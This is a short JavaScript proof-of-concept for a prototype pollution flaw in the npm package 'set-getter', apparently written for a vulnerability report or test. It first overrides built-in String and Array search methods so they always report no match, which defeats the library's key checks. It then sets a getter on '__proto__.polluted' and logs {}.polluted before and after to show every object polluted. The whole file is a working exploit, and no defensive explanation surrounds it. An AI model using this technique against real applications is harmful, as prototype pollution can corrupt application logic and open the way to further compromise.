String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, '__proto__.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);